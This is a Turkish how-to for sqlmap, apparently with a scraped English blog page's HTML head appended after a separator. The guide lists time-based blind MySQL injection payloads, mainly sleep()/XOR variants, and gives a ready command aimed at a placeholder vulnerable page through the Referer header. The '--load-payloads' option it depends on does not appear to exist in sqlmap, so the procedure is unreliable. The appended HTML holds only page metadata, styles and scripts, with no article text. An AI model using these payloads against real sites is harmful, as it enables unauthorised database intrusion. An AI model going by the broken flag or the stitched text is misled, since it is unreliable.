# sqlmap

 SQLmap için özel bir payload dosyası oluşturmak ve bu dosyayı kullanarak SQLmap'te kişiselleştirilmiş enjeksiyon testleri yapmak mümkündür. Verdiğiniz payloadları bu yönteme entegre edeceğiz.

### Adım 1: Özel Payload Dosyası Oluşturma

Öncelikle, tüm payloadlarınızı içeren bir dosya oluşturmalısınız. Bu dosyayı `custom_payloads.txt` olarak adlandırabiliriz. Dosya içeriğini aşağıdaki gibi düzenleyin:

#### `custom_payloads.txt`

```sql
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
0'XOR(if(now()=sysdate(),sleep(2),0))XOR'Z
0'XOR(if(now()=sysdate(),sleep(1),0))XOR'Z
if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"*/
if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/
if(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'"XOR(if(now()=sysdate(),sleep(9),0))OR"*/
if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'"XOR(if(now()=sysdate(),sleep(6),0))OR"*/
if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0))OR"*/
if(now()=sysdate(),sleep(5),0)/*'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0))OR"*/
Hurlburt'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
'XOR(if(now()=sysdate(),sleep(5*5),0))OR' -- -useragent
'+(select*from(select(sleep(7*7)))a)+'
'+(select*from(select(sleep(20)))a)+'
'+(select*from(select(sleep(20+10)))a)+'
XOR(if((select/**/666/**/where/**/[RANDNUM]=[RANDNUM1]),444,0))XOR
XOR(if((select/**/666/**/where/**/[RANDNUM]=[RANDNUM]),444,0))XOR
XOR(if((select/**/666/**/where/**/[INFERENCE]),444,0))XOR
```

### Adım 2: SQLmap Komutunu Kullanın

Özel payload dosyasını kullanarak SQLmap'te test yapmak için aşağıdaki komutu kullanabilirsiniz:

```bash
sqlmap -u "http://hedefsite.com/vulnerable_page.php?id=1" --dbms=mysql --technique=T --load-payloads=custom_payloads.txt --time-sec=10 --headers="Referer: http://www.google.com/search?hl=en&q=*"
```

**Komut Açıklamaları:**

- **--load-payloads=custom_payloads.txt**: Özel payload dosyasını belirtir.
- **--time-sec=10**: SQLmap'in bekleme süresini 10 saniye olarak ayarlar.
- **--headers**: Enjekte edilecek başlıkları belirtir (örneğin, `Referer`).

### Adım 3: Test Sonuçlarını Kontrol Etme

SQLmap çalıştırıldığında, özel payloadları kullanarak hedefteki SQL enjeksiyon güvenlik açıklarını test edecektir. Sonuçları gözlemleyerek hangi payloadların başarılı olduğunu ve hedefin yanıt süresine göre hangilerinin en etkili olduğunu değerlendirebilirsiniz.

### Sonuç

Bu yöntemle, SQLmap'te kendi belirttiğiniz özel payloadları kullanarak kişiselleştirilmiş SQL enjeksiyon testleri yapabilirsiniz. SQLmap'in mevcut seçeneklerini ve parametrelerini kullanarak test sürecinizi daha da optimize edebilirsiniz.

_______________________________________

<!doctype html>
<html lang="en-US">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="https://gmpg.org/xfn/11">

	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />

	<!-- This site is optimized with the Yoast SEO plugin v23.3 - https://yoast.com/wordpress/plugins/seo/ -->
	<title>Advanced SQLMap Customization - Ott3rly</title>
	<meta name="description" content="Do you know that you can add custom payloads to the SQLMap? You can unleash its full potential with the advanced customization!" />
	<link rel="canonical" href="https://ott3rly.com/advanced-sqlmap-customization/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="Advanced SQLMap Customization" />
	<meta property="og:description" content="Do you know that you can add custom payloads to the SQLMap? You can unleash its full potential with the advanced customization!" />
	<meta property="og:url" content="https://ott3rly.com/advanced-sqlmap-customization/" />
	<meta property="og:site_name" content="Ott3rly" />
	<meta property="article:published_time" content="2024-07-08T14:00:00+00:00" />
	<meta property="article:modified_time" content="2024-06-21T20:24:42+00:00" />
	<meta property="og:image" content="https://ott3rly.com/wp-content/uploads/2024/06/Advanced-SQLMap-Customization-Thumbnail-1024x585.png" />
	<meta property="og:image:width" content="1024" />
	<meta property="og:image:height" content="585" />
	<meta property="og:image:type" content="image/png" />
	<meta name="author" content="otterly" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:title" content="Advanced SQLMap Customization" />
	<meta name="twitter:description" content="Do you know that you can add custom payloads to the SQLMap? You can unleash its full potential with the advanced customization!" />
	<meta name="twitter:image" content="https://ott3rly.com/wp-content/uploads/2024/06/Advanced-SQLMap-Customization-Thumbnail.png" />
	<meta name="twitter:creator" content="@ott3rly" />
	<meta name="twitter:site" content="@ott3rly" />
	<meta name="twitter:label1" content="Written by" />
	<meta name="twitter:data1" content="otterly" />
	<meta name="twitter:label2" content="Est. reading time" />
	<meta name="twitter:data2" content="7 minutes" />
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://ott3rly.com/advanced-sqlmap-customization/","url":"https://ott3rly.com/advanced-sqlmap-customization/","name":"Advanced SQLMap Customization - Ott3rly","isPartOf":{"@id":"https://ott3rly.com/#website"},"primaryImageOfPage":{"@id":"https://ott3rly.com/advanced-sqlmap-customization/#primaryimage"},"image":{"@id":"https://ott3rly.com/advanced-sqlmap-customization/#primaryimage"},"thumbnailUrl":"https://ott3rly.com/wp-content/uploads/2024/06/Screenshot-from-2024-06-21-21-36-25-1024x597.png","datePublished":"2024-07-08T14:00:00+00:00","dateModified":"2024-06-21T20:24:42+00:00","author":{"@id":"https://ott3rly.com/#/schema/person/fa6a7c27d86118e5f8e0421a7d49a565"},"description":"Do you know that you can add custom payloads to the SQLMap? You can unleash its full potential with the advanced customization!","breadcrumb":{"@id":"https://ott3rly.com/advanced-sqlmap-customization/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://ott3rly.com/advanced-sqlmap-customization/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://ott3rly.com/advanced-sqlmap-customization/#primaryimage","url":"https://ott3rly.com/wp-content/uploads/2024/06/Screenshot-from-2024-06-21-21-36-25.png","contentUrl":"https://ott3rly.com/wp-content/uploads/2024/06/Screenshot-from-2024-06-21-21-36-25.png","width":1079,"height":629},{"@type":"BreadcrumbList","@id":"https://ott3rly.com/advanced-sqlmap-customization/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://ott3rly.com/"},{"@type":"ListItem","position":2,"name":"Advanced SQLMap Customization"}]},{"@type":"WebSite","@id":"https://ott3rly.com/#website","url":"https://ott3rly.com/","name":"Ott3rly","description":"Amazing Cyber Security","alternateName":"Otterly","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://ott3rly.com/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"Person","@id":"https://ott3rly.com/#/schema/person/fa6a7c27d86118e5f8e0421a7d49a565","name":"otterly","sameAs":["https://ott3rly.com"]}]}</script>
	<!-- / Yoast SEO plugin. -->


<link rel='dns-prefetch' href='//www.googletagmanager.com' />
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='dns-prefetch' href='//pagead2.googlesyndication.com' />
<link rel="alternate" type="application/rss+xml" title="Ott3rly &raquo; Feed" href="https://ott3rly.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Ott3rly &raquo; Comments Feed" href="https://ott3rly.com/comments/feed/" />
<script>
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/ott3rly.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.1"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
</script>
<style id='wp-emoji-styles-inline-css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://ott3rly.com/wp-includes/css/dist/block-library/style.min.css?ver=6.6.1' media='all' />
<style id='wp-block-library-theme-inline-css'>
.wp-block-audio :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-audio :where(figcaption){color:#ffffffa6}.wp-block-audio{margin:0 0 1em}.wp-block-code{border:1px solid #ccc;border-radius:4px;font-family:Menlo,Consolas,monaco,monospace;padding:.8em 1em}.wp-block-embed :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-embed :where(figcaption){color:#ffffffa6}.wp-block-embed{margin:0 0 1em}.blocks-gallery-caption{color:#555;font-size:13px;text-align:center}.is-dark-theme .blocks-gallery-caption{color:#ffffffa6}:root :where(.wp-block-image figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme :root :where(.wp-block-image figcaption){color:#ffffffa6}.wp-block-image{margin:0 0 1em}.wp-block-pullquote{border-bottom:4px solid;border-top:4px solid;color:currentColor;margin-bottom:1.75em}.wp-block-pullquote cite,.wp-block-pullquote footer,.wp-block-pullquote__citation{color:currentColor;font-size:.8125em;font-style:normal;text-transform:uppercase}.wp-block-quote{border-left:.25em solid;margin:0 0 1.75em;padding-left:1em}.wp-block-quote cite,.wp-block-quote footer{color:currentColor;font-size:.8125em;font-style:normal;position:relative}.wp-block-quote.has-text-align-right{border-left:none;border-right:.25em solid;padding-left:0;padding-right:1em}.wp-block-quote.has-text-align-center{border:none;padding-left:0}.wp-block-quote.is-large,.wp-block-quote.is-style-large,.wp-block-quote.is-style-plain{border:none}.wp-block-search .wp-block-search__label{font-weight:700}.wp-block-search__button{border:1px solid #ccc;padding:.375em .625em}:where(.wp-block-group.has-background){padding:1.25em 2.375em}.wp-block-separator.has-css-opacity{opacity:.4}.wp-block-separator{border:none;border-bottom:2px solid;margin-left:auto;margin-right:auto}.wp-block-separator.has-alpha-channel-opacity{opacity:1}.wp-block-separator:not(.is-style-wide):not(.is-style-dots){width:100px}.wp-block-separator.has-background:not(.is-style-dots){border-bottom:none;height:1px}.wp-block-separator.has-background:not(.is-style-wide):not(.is-style-dots){height:2px}.wp-block-table{margin:0 0 1em}.wp-block-table td,.wp-block-table th{word-break:normal}.wp-block-table :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-table :where(figcaption){color:#ffffffa6}.wp-block-video :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-video :where(figcaption){color:#ffffffa6}.wp-block-video{margin:0 0 1em}:root :where(.wp-block-template-part.has-background){margin-bottom:0;margin-top:0;padding:1.25em 2.375em}
</style>
<link rel='stylesheet' id='resume-x-gb-block-css' href='https://ott3rly.com/wp-content/themes/resume-x/assets/css/admin-block.css?ver=1.0' media='all' />
<link rel='stylesheet' id='resume-x-admin-google-font-css' href='https://fonts.googleapis.com/css?family=Montserrat%3A400%2C400i%2C700%2C700i%7CPoppins%3A400%2C400i%2C700%2C700i&#038;subset=latin%2Clatin-ext' media='all' />
<style id='classic-theme-styles-inline-css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='click-to-top-font-awesome.min-css' href='https://ott3rly.com/wp-content/plugins/click-to-top/assets/css/font-awesome.min.css?ver=4.5' media='all' />
<link rel='stylesheet' id='click-to-top-hover-css' href='https://ott3rly.com/wp-content/plugins/click-to-top/assets/css/hover.css?ver=1.0' media='all' />
<link rel='stylesheet' id='click-to-top-style-css' href='https://ott3rly.com/wp-content/plugins/click-to-top/assets/css/click-top-style.css?ver=1.7' media='all' />
<link rel='stylesheet' id='url-shortify-css' href='https://ott3rly.com/wp-content/plugins/url-shortify/lite/dist/styles/url-shortify.css?ver=1.9.4' media='all' />
<link rel='stylesheet' id='resumex-dark-google-font-css' href='https://fonts.googleapis.com/css?family=Poppins%3A400%2C600%7CLato%3A400%2C600%2C700&#038;subset=latin%2Clatin-ext' media='all' />
<link rel='stylesheet' id='resume-x-style-css' href='https://ott3rly.com/wp-content/themes/resumex-dark/style.css?ver=1.0.3' media='all' />
<link rel='stylesheet' id='resumex-dark-parent-style-css' href='https://ott3rly.com/wp-content/themes/resume-x/style.css?ver=1.0.3' media='all' />
<link rel='stylesheet' id='bootstrap-css' href='https://ott3rly.com/wp-content/themes/resume-x/assets/css/bootstrap.css?ver=5.0.1' media='all' />
<link rel='stylesheet' id='resume-x-main-style-css' href='https://ott3rly.com/wp-content/themes/resume-x/assets/css/main.css?ver=1.0.3' media='all' />
<link rel='stylesheet' id='resume-x-default-style-css' href='https://ott3rly.com/wp-content/themes/resume-x/assets/css/default-style.css?ver=1.0.3' media='all' />
<link rel='stylesheet' id='resumex-dark-main-css' href='https://ott3rly.com/wp-content/themes/resumex-dark/assets/css/main.css?ver=1.0.3' media='all' />
<link rel='stylesheet' id='resume-x-google-font-css' href='https://fonts.googleapis.com/css?family=Montserrat%3A400%2C400i%2C700%2C700i%7CPoppins%3A400%2C400i%2C700%2C700i&#038;subset=latin%2Clatin-ext' media='all' />
<link rel='stylesheet' id='slicknav-css' href='https://ott3rly.com/wp-content/themes/resume-x/assets/css/slicknav.css?ver=1.0.10' media='all' />
<link rel='stylesheet' id='fontawesome-css' href='https://ott3rly.com/wp-content/themes/resume-x/assets/css/all.css?ver=5.15.3' media='all' />
<link rel='stylesheet' id='resume-x-block-style-css' href='https://ott3rly.com/wp-content/themes/resume-x/assets/css/block.css?ver=1.0.3' media='all' />
<link rel='stylesheet' id='resume-x-responsive-style-css' href='https://ott3rly.com/wp-content/themes/resume-x/assets/css/responsive.css?ver=1.0.3' media='all' />
<link rel='stylesheet' id='heateor_sss_frontend_css-css' href='https://ott3rly.com/wp-content/plugins/sassy-social-share/public/css/sassy-social-share-public.css?ver=3.3.66' media='all' />
<style id='heateor_sss_frontend_css-inline-css'>
.heateor_sss_button_instagram span.heateor_sss_svg,a.heateor_sss_instagram span.heateor_sss_svg{background:radial-gradient(circle at 30% 107%,#fdf497 0,#fdf497 5%,#fd5949 45%,#d6249f 60%,#285aeb 90%)}.heateor_sss_horizontal_sharing .heateor_sss_svg,.heateor_sss_standard_follow_icons_container .heateor_sss_svg{color:#fff;border-width:0px;border-style:solid;border-color:transparent}.heateor_sss_horizontal_sharing .heateorSssTCBackground{color:#666}.heateor_sss_horizontal_sharing span.heateor_sss_svg:hover,.heateor_sss_standard_follow_icons_container span.heateor_sss_svg:hover{border-color:transparent;}.heateor_sss_vertical_sharing span.heateor_sss_svg,.heateor_sss_floating_follow_icons_container span.heateor_sss_svg{color:#fff;border-width:0px;border-style:solid;border-color:transparent;}.heateor_sss_vertical_sharing .heateorSssTCBackground{color:#666;}.heateor_sss_vertical_sharing span.heateor_sss_svg:hover,.heateor_sss_floating_follow_icons_container span.heateor_sss_svg:hover{border-color:transparent;}@media screen and (max-width:783px) {.heateor_sss_vertical_sharing{display:none!important}}
</style>
<script src="https://ott3rly.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script src="https://ott3rly.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script src="https://ott3rly.com/wp-content/plugins/click-to-top/assets/js/jquery.easing.js?ver=1.0" id="click-to-top-easing-js"></script>
<script src="https://ott3rly.com/wp-content/plugins/click-to-top/assets/js/jquery.scrollUp.js?ver=1.0" id="click-to-top-scrollUp-js"></script>
<script id="url-shortify-js-extra">
var usParams = {"ajaxurl":"https:\/\/ott3rly.com\/wp-admin\/admin-ajax.php"};
</script>
<script src="https://ott3rly.com/wp-content/plugins/url-shortify/lite/dist/scripts/url-shortify.js?ver=1.9.4" id="url-shortify-js"></script>

<!-- Google tag (gtag.js) snippet added by Site Kit -->

<!-- Google Analytics snippet added by Site Kit -->
<script src="https://www.googletagmanager.com/gtag/js?id=GT-5TCZKXM" id="google_gtagjs-js" async></script>
<script id="google_gtagjs-js-after">
window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}
gtag("set","linker",{"domains":["ott3rly.com"]});
gtag("js", new Date());
gtag("set", "developer_id.dZTNiMT", true);
gtag("config", "GT-5TCZKXM");
</script>

<!-- End Google tag (gtag.js) snippet added by Site Kit -->
<link rel="https://api.w.org/" href="https://ott3rly.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://ott3rly.com/wp-json/wp/v2/posts/783" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://ott3rly.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.1" />
<link rel='shortlink' href='https://ott3rly.com/pqlz' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://ott3rly.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fott3rly.com%2Fadvanced-sqlmap-customization%2F" />
